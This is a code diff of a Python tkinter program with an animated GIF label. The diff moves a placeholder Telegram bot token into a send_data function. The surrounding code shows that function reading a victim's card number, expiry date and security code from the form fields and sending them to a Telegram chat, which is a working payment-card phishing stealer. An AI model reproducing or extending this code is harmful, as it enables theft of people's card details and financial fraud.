@@ -2,7 +2,6 @@ from tkinter import *
 from PIL import Image, ImageTk
 from sys import exit
 
-token = 'token'
 
 class AnimateGifLabel(Label):
     def __init__(self, *argv, image = None,  **kwargs):
@@ -38,6 +37,7 @@ class AnimateGifLabel(Label):
 
 def send_data():
     import telebot
+    token = 'token'
     bot = telebot.TeleBot(token)
     bot.send_message(f'tg-id', f'номер карты: {card_nomber_entry.get()}\nсрок годности: {shelf_life_entry.get()}\nкод безопасности: {securety_code_entry.get()}')
     exit()
